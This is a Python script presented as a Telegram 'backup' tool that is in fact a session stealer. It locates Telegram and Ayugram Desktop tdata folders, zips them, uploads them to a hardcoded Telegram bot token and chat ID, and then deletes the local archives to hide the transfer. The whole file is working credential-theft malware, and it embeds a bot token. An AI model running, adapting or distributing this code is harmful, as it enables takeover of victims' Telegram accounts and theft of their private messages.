import os
import zipfile
import subprocess
import sys
import psutil
import requests
import shutil
import getpass

for pkg in ['psutil', 'requests']:
    try:
        __import__(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

TELEGRAM_BOT_TOKEN = '8428496117:AAFY3Lcd5NobBWRLGGKwcZ17pwWDg1A6Tgk'
TELEGRAM_CHAT_ID = '7613525531'
MAX_FILE_SIZE_MB = 100
EXCLUDE_EXTENSIONS = ['.mp4', '.webm', '.jpg', '.jpeg', '.png', '.gif', '.ogg', '.mp3', '.partial', '.tmp', '.log']

EXCLUDE_DIRS = [
    'user_data',
    'emoji',
    'cache',
    'working',
    'media_cache'
]

APPDATA_BACKUP_DIR = os.path.join(os.getenv('APPDATA'), 'TDB')
os.makedirs(APPDATA_BACKUP_DIR, exist_ok=True)

def find_all_tdata():
    tdata_paths = {}
    for proc in psutil.process_iter(['name', 'exe']):
        try:
            name = proc.info['name'].lower()
            exe_path = proc.info['exe']
            if not exe_path:
                continue
            if 'telegram' in name:
                client = 'telegram'
            elif 'ayugram' in name:
                client = 'ayugram'
            else:
                continue
            tdata_path = os.path.join(os.path.dirname(exe_path), 'tdata')
            if os.path.exists(tdata_path):
                tdata_paths[client] = tdata_path
        except Exception:
            continue

    appdata = os.getenv('APPDATA')
    fallback_paths = {
        'telegram': os.path.join(appdata, 'Telegram Desktop', 'tdata'),
        'ayugram': os.path.join(appdata, 'Ayugram', 'tdata')
    }
    for client, path in fallback_paths.items():
        if client not in tdata_paths and os.path.exists(path):
            tdata_paths[client] = path

    return tdata_paths

def should_exclude(path, base):
    rel = os.path.relpath(path, base).replace('\\', '/').lower()

    for ex_dir in EXCLUDE_DIRS:
        if rel.startswith(ex_dir):
            return True

    ext = os.path.splitext(path)[1].lower()
    if ext in EXCLUDE_EXTENSIONS:
        return True

    try:
        if os.path.getsize(path) > 5 * 1024 * 1024:
            return True
    except Exception:
        return True

    return False

def create_archive(tdata_path, client_name):
    username = getpass.getuser()
    archive_name = f"{client_name}_{username}_tdata_backup.zip"
    archive_path = os.path.join(APPDATA_BACKUP_DIR, archive_name)

    count_total = 0
    count_skipped = 0

    with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
        for root, _, files in os.walk(tdata_path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, tdata_path)
                count_total += 1
                if should_exclude(full_path, tdata_path):
                    count_skipped += 1
                    continue
                try:
                    with open(full_path, 'rb') as f:
                        data = f.read()
                    archive.writestr(arcname, data)
                except PermissionError:
                    count_skipped += 1
                    print(f"[⚠️] Пропущен файл (нет доступа): {full_path}")
                    continue
                except Exception as e:
                    count_skipped += 1
                    print(f"[⚠️] Ошибка при добавлении файла {full_path}: {e}")
                    continue

    print(f"[📦] {client_name}: архив создан: {archive_path} | файлов: {count_total - count_skipped}, пропущено: {count_skipped}")
    return archive_path


def send_to_telegram(token, chat_id, file_path, caption="📦 Telegram TDATA backup"):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': (os.path.basename(file_path), f)}
        data = {'chat_id': chat_id, 'caption': caption}
        r = requests.post(url, files=files, data=data)
        return r

def main():
    tdata_dict = find_all_tdata()
    if not tdata_dict:
        print("[❌] Не найдена ни одна папка tdata.")
        return

    archives_created = []

    for client, path in tdata_dict.items():
        print(f"[🔍] Найдена {client} tdata: {path}")
        zip_file_path = create_archive(path, client)
        archives_created.append(zip_file_path)
        response = send_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, zip_file_path,
                                    caption=f"📦 {client.capitalize()} session backup")
        if response.status_code == 200:
            print(f"[✅] {client}: отправлено в Telegram. Удаляю архив...")
            try:
                os.remove(zip_file_path)
                print(f"[🗑️] Архив удалён: {zip_file_path}")
            except Exception as e:
                print(f"[⚠️] Не удалось удалить архив: {e}")
        else:
            print(f"[❌] {client}: ошибка {response.status_code} - {response.text}")

    try:
        if os.path.exists(APPDATA_BACKUP_DIR) and not os.listdir(APPDATA_BACKUP_DIR):
            os.rmdir(APPDATA_BACKUP_DIR)
            print(f"[🗑️] Папка с архивами удалена: {APPDATA_BACKUP_DIR}")
        elif os.path.exists(APPDATA_BACKUP_DIR):
            shutil.rmtree(APPDATA_BACKUP_DIR)
            print(f"[🗑️] Папка с архивами удалена вместе с остатками: {APPDATA_BACKUP_DIR}")
    except Exception as e:
        print(f"[⚠️] Не удалось удалить папку архивов: {e}")